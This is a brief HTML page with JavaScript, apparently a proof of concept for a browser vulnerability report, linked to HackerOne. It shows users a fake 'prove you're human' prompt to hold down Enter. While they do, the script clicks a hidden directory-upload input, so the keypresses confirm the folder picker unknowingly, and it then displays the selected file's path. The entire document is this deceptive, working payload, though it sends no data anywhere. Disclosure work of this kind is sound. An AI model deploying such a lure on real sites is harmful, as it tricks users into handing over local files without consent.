<body>
    <a href="https://hackerone.com">Report on hackerone</a>
    <h3 id="qmsg">Hold down the ENTER key for 5 seconds to prove you're human..</h3>
    <input id="thing" type="file" webkitdirectory mozdirectory />

    <script>

        var r = new FileReader();
        thing.onchange = function () {
            qmsg.innerHTML = thing.files[0].webkitRelativePath;



        };

        //This is where we detect if the user is holding the Enter button.
        var i = 0;
        document.onkeydown = function () {
            i++;
            if (i > 4) {
                thing.click();
                i = -10000;
                document.onkeydown = null;

            };
        };
    </script>
